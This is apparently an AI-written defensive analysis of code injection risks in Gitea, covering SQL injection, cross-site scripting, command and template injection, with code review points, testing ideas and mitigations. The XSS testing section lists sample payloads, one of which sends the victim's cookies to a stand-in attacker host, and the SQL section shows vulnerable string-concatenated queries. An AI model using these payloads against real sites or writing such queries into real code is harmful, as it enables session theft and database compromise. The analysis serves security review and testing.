Okay, here's a deep analysis of the "Code Injection" attack tree path for a Gitea application, following the structure you requested.

## Deep Analysis of Gitea Attack Tree Path: 2.1 Code Injection

### 1. Define Objective, Scope, and Methodology

**Objective:**

The primary objective of this deep analysis is to thoroughly examine the "Code Injection" attack vector against a Gitea instance.  This involves identifying specific vulnerabilities, assessing their exploitability, determining potential impact, and recommending concrete mitigation strategies.  The ultimate goal is to provide actionable insights to the development team to enhance the security posture of the Gitea application against code injection attacks.

**Scope:**

This analysis focuses exclusively on the "Code Injection" attack vector (node 2.1 in the provided attack tree).  It encompasses the following sub-vectors:

*   **SQL Injection (SQLi):**  Analyzing Gitea's database interaction layer for potential SQLi vulnerabilities.
*   **Cross-Site Scripting (XSS):**  Examining input validation, output encoding, and other relevant mechanisms to identify and assess XSS vulnerabilities.
*   **Other Code Injection Types:**  Briefly considering less common injection types like command injection and template injection, focusing on areas where they might be plausible.

This analysis *does not* cover other attack vectors in the broader attack tree (e.g., authentication bypass, denial of service).  It also assumes a standard Gitea installation without significant custom modifications, although the principles discussed can be applied to customized deployments.

**Methodology:**

The analysis will employ a combination of the following techniques:

1.  **Code Review (Static Analysis):**  We will examine the Gitea source code (from the provided repository: [https://github.com/go-gitea/gitea](https://github.com/go-gitea/gitea)) to identify potential vulnerabilities.  This will involve:
    *   Searching for known vulnerable patterns (e.g., string concatenation in SQL queries, lack of input sanitization, improper output encoding).
    *   Analyzing the use of Gitea's ORM (Object-Relational Mapper) to understand how it mitigates SQLi.
    *   Examining input handling for web forms, API endpoints, and other user-controlled data sources.
    *   Reviewing the use of templating engines and their security configurations.

2.  **Dynamic Analysis (Testing):**  While a full penetration test is outside the scope of this document, we will outline potential testing strategies that could be used to confirm vulnerabilities and assess their exploitability.  This includes:
    *   Fuzzing: Providing malformed or unexpected input to various Gitea interfaces.
    *   Manual testing:  Crafting specific payloads to test for SQLi, XSS, and other injection flaws.
    *   Using automated vulnerability scanners (with appropriate caution and configuration).

3.  **Threat Modeling:**  We will consider realistic attack scenarios and attacker motivations to understand the potential impact of successful code injection attacks.

4.  **Best Practices Review:**  We will compare Gitea's security practices against industry best practices and security guidelines (e.g., OWASP guidelines, Go security best practices).

### 2. Deep Analysis of Attack Tree Path: 2.1 Code Injection

#### 2.1.1 SQL Injection (SQLi)

*   **Description (Detailed):** SQL injection occurs when an attacker can manipulate SQL queries sent to the database.  This is typically achieved by injecting malicious SQL code into user-supplied input that is not properly sanitized or validated.  Gitea, like many modern web applications, uses an ORM to interact with the database.  ORMs provide an abstraction layer that helps prevent SQLi by automatically generating parameterized queries.  However, ORMs are not a silver bullet, and vulnerabilities can still exist if the ORM is misused or if raw SQL queries are used in certain parts of the application.

*   **Code Review Focus:**
    *   **ORM Usage:**  Examine how Gitea's ORM (likely `xorm` or a similar library) is used throughout the codebase.  Look for instances where:
        *   Raw SQL queries are used (`db.SQL(...)`).  These are high-priority areas for scrutiny.
        *   String concatenation or interpolation is used to build query conditions, even within the ORM.  This can bypass the ORM's protection.
        *   User-supplied input is directly used in `Where()`, `OrderBy()`, or other query-building methods without proper sanitization.
    *   **Database Interaction Points:**  Identify all locations where Gitea interacts with the database, including:
        *   User authentication and authorization.
        *   Repository management (creating, deleting, updating repositories).
        *   Issue tracking and pull request management.
        *   User profile management.
        *   Search functionality.
        *   API endpoints that interact with the database.
    *   **Specific Code Examples (Hypothetical - Requires Actual Code Review):**
        *   **Vulnerable:** `db.SQL("SELECT * FROM users WHERE username = '" + userInput + "'")`
        *   **Potentially Vulnerable (ORM Misuse):** `db.Where("username = " + userInput).Find(&users)`
        *   **Likely Safe (Proper ORM Usage):** `db.Where("username = ?", userInput).Find(&users)`

*   **Dynamic Analysis (Testing Strategies):**
    *   **Fuzzing:**  Use a fuzzer to send a large number of malformed SQL queries to various input fields and API endpoints.  Monitor for database errors or unexpected behavior.
    *   **Manual Testing:**  Craft specific SQLi payloads to test for common vulnerabilities:
        *   **Error-based SQLi:**  Try to trigger database errors to reveal information about the database structure.
        *   **Boolean-based blind SQLi:**  Use conditional statements to extract data one bit at a time.
        *   **Time-based blind SQLi:**  Use time delays to infer information about the database.
        *   **UNION-based SQLi:**  Use the `UNION` operator to combine the results of a malicious query with the results of a legitimate query.
    *   **Automated Scanners:**  Use tools like SQLMap (with caution and proper authorization) to automatically scan for SQLi vulnerabilities.

*   **Mitigation Strategies:**
    *   **Strict ORM Usage:**  Enforce the consistent and correct use of the ORM for all database interactions.  Avoid raw SQL queries whenever possible.
    *   **Parameterized Queries:**  Ensure that all queries use parameterized queries or prepared statements, even when using the ORM.
    *   **Input Validation:**  Validate all user-supplied input against a strict whitelist of allowed characters and formats.
    *   **Least Privilege:**  Ensure that the database user used by Gitea has the minimum necessary privileges.  It should not have administrative access to the database.
    *   **Web Application Firewall (WAF):**  Deploy a WAF to help detect and block SQLi attacks.
    *   **Regular Security Audits:**  Conduct regular security audits and penetration tests to identify and address potential vulnerabilities.
    *   **Database-Specific Security Measures:** Implement database-specific security measures, such as stored procedures with strong input validation, and configure database auditing to detect suspicious activity.

#### 2.1.2 Cross-Site Scripting (XSS)

*   **Description (Detailed):** XSS vulnerabilities allow attackers to inject malicious JavaScript code into web pages viewed by other users.  This can lead to a variety of attacks, including session hijacking, cookie theft, website defacement, and phishing.  There are three main types of XSS:
    *   **Reflected XSS:**  The malicious script is reflected off the web server, typically through a URL parameter or form input.
    *   **Stored XSS:**  The malicious script is stored on the server (e.g., in a database) and served to other users.
    *   **DOM-based XSS:**  The vulnerability exists in the client-side JavaScript code, and the malicious script is executed without being sent to the server.

*   **Code Review Focus:**
    *   **Input Validation:**  Identify all points where user-supplied input is accepted, including:
        *   Form submissions (e.g., creating issues, comments, pull requests).
        *   URL parameters.
        *   API requests.
        *   Websockets.
        *   Markdown rendering.
    *   **Output Encoding:**  Examine how user-supplied input is displayed on web pages.  Ensure that proper output encoding is used to prevent the browser from interpreting the input as code.  This includes:
        *   HTML encoding (e.g., `&lt;` for `<`, `&gt;` for `>`).
        *   JavaScript encoding (e.g., `\x3C` for `<`).
        *   URL encoding (e.g., `%20` for space).
        *   Context-aware encoding: The correct encoding method depends on where the data is being displayed (e.g., HTML attribute, JavaScript string, URL).
    *   **Templating Engine:**  Review the use of Gitea's templating engine (likely Go's `html/template` package).  Ensure that it is configured to automatically escape output by default.  Look for instances where auto-escaping is disabled or bypassed.
    *   **Content Security Policy (CSP):**  Check if Gitea implements a CSP.  A well-configured CSP can significantly reduce the risk of XSS by restricting the sources from which scripts can be loaded.
    *   **Markdown Rendering:** Gitea likely uses a Markdown renderer to display user-provided content.  This is a common source of XSS vulnerabilities.  Examine the Markdown renderer's configuration and ensure that it is configured to sanitize input and prevent the execution of arbitrary JavaScript.  Look for known vulnerabilities in the specific Markdown renderer being used.
    *   **JavaScript Frameworks:**  If Gitea uses any JavaScript frameworks (e.g., React, Vue.js, Angular), review their security best practices and ensure they are followed.

*   **Dynamic Analysis (Testing Strategies):**
    *   **Fuzzing:**  Use a fuzzer to send a large number of potentially malicious strings to various input fields and API endpoints.  Monitor for JavaScript execution or unexpected behavior.
    *   **Manual Testing:**  Craft specific XSS payloads to test for common vulnerabilities:
        *   **Simple Alert:**  `<script>alert(1)</script>`
        *   **Cookie Stealing:**  `<script>document.location='http://attacker.com/?cookie='+document.cookie</script>`
        *   **DOM Manipulation:**  `<img src=x onerror=alert(1)>`
    *   **Automated Scanners:**  Use tools like OWASP ZAP or Burp Suite to automatically scan for XSS vulnerabilities.

*   **Mitigation Strategies:**
    *   **Input Validation:**  Validate all user-supplied input against a strict whitelist of allowed characters and formats.  This is a defense-in-depth measure, but output encoding is the primary defense.
    *   **Output Encoding (Context-Aware):**  Use appropriate output encoding for all user-supplied data displayed on web pages.  The encoding method should be chosen based on the context in which the data is being displayed.
    *   **Content Security Policy (CSP):**  Implement a strict CSP to restrict the sources from which scripts can be loaded.  This can significantly reduce the impact of XSS vulnerabilities.
    *   **HttpOnly Cookies:**  Set the `HttpOnly` flag on all cookies to prevent JavaScript from accessing them.  This mitigates the risk of cookie theft.
    *   **X-XSS-Protection Header:**  Set the `X-XSS-Protection` header to enable the browser's built-in XSS filter.  This is a defense-in-depth measure.
    *   **Secure Markdown Renderer:**  Use a secure Markdown renderer that is configured to sanitize input and prevent the execution of arbitrary JavaScript.
    *   **Regular Security Audits:**  Conduct regular security audits and penetration tests to identify and address potential vulnerabilities.
    * **Sanitize HTML:** Use a library like `bluemonday` in Go to sanitize HTML input, removing potentially dangerous tags and attributes.

#### 2.1.3 Other Code Injection Types

*   **Command Injection:**
    *   **Description:**  Command injection occurs when an attacker can inject arbitrary commands into the operating system.  This is typically achieved by manipulating input that is used to construct shell commands.
    *   **Likelihood:** Low (Gitea is written in Go, which makes it less susceptible to command injection than languages like PHP or Perl, but it's still possible if system calls are made improperly).
    *   **Code Review Focus:**  Search for any instances where Gitea executes external commands (e.g., using `os/exec` in Go).  Examine how these commands are constructed and ensure that user-supplied input is not directly concatenated into the command string.  Use the `exec.Command()` function with separate arguments instead of a single command string.
    *   **Mitigation:**  Avoid executing external commands whenever possible.  If necessary, use a safe API for executing commands (e.g., `exec.Command()` in Go) and sanitize all user-supplied input.

*   **Template Injection:**
    *   **Description:**  Template injection occurs when an attacker can inject malicious code into a server-side template.  This can allow the attacker to execute arbitrary code on the server.
    *   **Likelihood:** Low to Medium (Depends on how Gitea uses templates and if user input is directly rendered within templates without proper escaping).
    *   **Code Review Focus:**  Examine how Gitea uses its templating engine.  Ensure that user-supplied input is not directly rendered within templates without proper escaping.  Use the templating engine's built-in escaping mechanisms.
    *   **Mitigation:**  Use a secure templating engine that automatically escapes output by default.  Avoid passing user-supplied input directly to the template engine without proper sanitization and escaping.
